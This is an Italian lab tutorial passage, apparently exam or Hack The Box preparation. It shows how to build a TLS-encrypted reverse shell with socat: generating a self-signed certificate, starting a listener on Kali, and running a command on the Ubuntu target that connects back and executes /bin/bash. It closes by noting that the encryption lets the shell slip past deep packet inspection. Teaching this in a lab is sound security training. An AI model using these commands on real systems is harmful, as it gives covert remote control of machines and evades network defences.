## La Soluzione Pratica: Socat TLS (Pronto per l'esame)

Nel contesto di un laboratorio o di una macchina Hack The Box, riscrivere ogni volta un intero proxy in C è inefficiente. Si usa **`socat`**, che implementa nativamente tutta la logica dei processi e delle pipe che abbiamo appena descritto.

Visto che hai Kali e Ubuntu pronti nella `rete_esame`, ecco come configurare la tua prima **Reverse Shell cifrata con TLS**:

### Passo 1: Generare il Certificato su Kali (`192.168.100.177`)

La cifratura TLS richiede una chiave e un certificato. Creiamo un certificato auto-firmato (self-signed) direttamente sul terminale di Kali:

Bash

```
# Genera la chiave privata e il certificato valido per un anno
openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 365 -out server.crt

# Unisce chiave e certificato in un unico file .pem richiesto da socat
cat server.key server.crt > cert.pem
```

_(Quando ti chiede i dati del certificato, premi semplicemente INVIO per lasciare i valori di default)._

### Passo 2: Avviare il Listener Cifrato su Kali

Invece di Netcat, usiamo `socat` dicendogli di ascoltare in modalità OpenSSL, passando il certificato appena creato e impostando `verify=0` (per accettare connessioni senza verificare la controparte, tipico dei lab):

Bash

```
socat OPENSSL-LISTEN:4444,cert=cert.pem,verify=0 FILE:`tty`,raw,echo=0
```

### Passo 3: Lanciare la Shell da Ubuntu (`192.168.100.165`)

Su Ubuntu, lanciamo `socat` per stabilire la connessione di ritorno in modalità protetta, indicando di eseguire Bash una volta agganciato il tunnel:

Bash

```
socat OPENSSL:192.168.100.177:4444,verify=0 EXEC:/bin/bash,stderr
```

## 🔬 La Verifica Finale su Wireshark

Se provi ad avviare questa sessione con `socat` mentre Wireshark è in ascolto sulla `eth1`, noterai una differenza radicale rispetto a prima:

- **I protocolli cambiano:** Non vedrai più solo pacchetti `TCP` generici. Dopo il Three-Way Handshake, vedrai comparire pacchetti con protocollo **`TLSv1.2`** o **`TLSv1.3`**.
    
- **Negoziazione:** Vedrai i messaggi di `Client Hello`, `Server Hello` e lo scambio delle chiavi crittografiche.
    
- **Payload invisibile:** Se provi a fare di nuovo _Follow -> TCP Stream_, non leggerai mai più stringhe come `whoami` o `shell.c`. Vedrai esclusivamente un ammasso di byte casuali e illeggibili (Application Data cifrato).
    

Qualsiasi sistema di difesa Deep Packet Inspection (DPI) lungo il percorso vedrà solo un normale flusso di dati HTTPS, permettendo alla tua shell di transitare indisturbata.